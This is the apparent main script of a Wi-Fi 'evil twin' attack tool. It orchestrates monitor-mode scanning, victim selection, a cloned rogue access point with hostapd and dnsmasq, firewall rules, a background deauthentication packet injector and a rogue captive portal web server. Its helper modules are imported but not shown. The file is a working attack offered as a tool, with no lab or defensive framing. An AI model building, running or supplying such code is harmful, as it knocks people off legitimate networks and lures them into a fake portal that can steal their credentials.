# =====================================================================
#                   ATTACK (ON) TOOL
# =====================================================================
"""
set adapter monitor mode
start channel hopper
scan
stop channel hopper
chose target
scan traffic victims
chose victims
set hostapd file, dnsmasq, firewall rules
start flask server
start injector in background

"""
# =====================================================================
#                   IMPORTS & CONFIGURATION
# =====================================================================

import sys
import time
import subprocess
import threading

from sniffer_filter import set_monitor_mode, channel_hopper, scan_networks, scan_victims
from twin_setup import create_evil_ap, set_firewall_rules, clear_firewall_rules, start_dns_dhcp, setup_network
from injector import set_injector_adapter,send_disas_packets
from captive_server import run_flask_server
from interface_input import interface_select

# Interfaces
EV_INTERFACE = "wlxe84e06aed7c3"
#EVIL_AP_DRIVER = "mt7921u"
INJECT_INTERFACE = "wlxc83a35c2fcb0"

# Thread flags
stop_injection = threading.Event()
# DONE & WORKING 
def reset_services():
    print("[*] Restoring normal network services...")
    subprocess.run(["sudo", "systemctl", "start", "NetworkManager"])

# =====================================================================
#                       MAIN
# =====================================================================
def main():
    injection_thread = None
    hostapd_proc = None
    dnsmasq_proc = None
    target_ap = None
    victim = None

    try:
        EV_INTERFACE = interface_select(job_name="Monitor and Rouge Network Access")
        if EV_INTERFACE:
            INJECT_INTERFACE = interface_select(job_name="Injector- send disas/dieauth packets", exclude=EV_INTERFACE)
        set_monitor_mode(EV_INTERFACE)
        while not target_ap:
            target_ap = scan_networks(EV_INTERFACE,20)
            if not target_ap:
                choice = input("[!] Scan again (Y) or exit program (N)?: ").strip().upper()
                if choice == "N":
                    print("[*] Exiting program")
                    reset_services()
                    sys.exit(1)
                print("[*] Scanning again ..")

        
        victim = scan_victims(EV_INTERFACE, target_ap, 30)


        hostapd_proc = create_evil_ap(EV_INTERFACE,target_ap) #WORKS 4 SURE

        clear_firewall_rules(EV_INTERFACE)
        set_firewall_rules(EV_INTERFACE)
        dnsmasq_proc = start_dns_dhcp()

        set_injector_adapter(INJECT_INTERFACE, target_ap['channel'])
        injection_thread = threading.Thread(target=send_disas_packets,args=(INJECT_INTERFACE,victim,target_ap,stop_injection), daemon=True)
        injection_thread.start()
        print("[+] Starting Rogue Captive Portal Web Server...")
        flask_thread = threading.Thread(target=run_flask_server, args=(EV_INTERFACE,))
        
        flask_thread.daemon = True 
        flask_thread.start()
        print("[+] All systems active. Press Ctrl+C to stop the tool.")
        while True:
           time.sleep(1) # Keep main thread alive monitoring connections


    except KeyboardInterrupt:
        print("\n[!] Stopped attack by user...")

    except Exception as e:
        print(f"got error {e}")

    finally:
        stop_injection.set()
        if injection_thread is not None:
            injection_thread.join()
            # Check if dnsmasq actually exists before trying to terminate it
        if dnsmasq_proc is not None:
            try:
                dnsmasq_proc.terminate()
                dnsmasq_proc.wait(timeout=2)
            except Exception as e:
                print(f"Error stopping dnsmasq: {e}")
        else:
            print("dnsmasq_proc was never started (it is None).")

        # Do the same for hostapd
        if hostapd_proc is not None:
            try:
                hostapd_proc.terminate()
                hostapd_proc.wait(timeout=2)
            except Exception as e:
                print(f"Error stopping hostapd: {e}")
        else:
            print("hostapd_proc was never started (it is None).")

        reset_services()



    


if __name__ == "__main__":
    main()
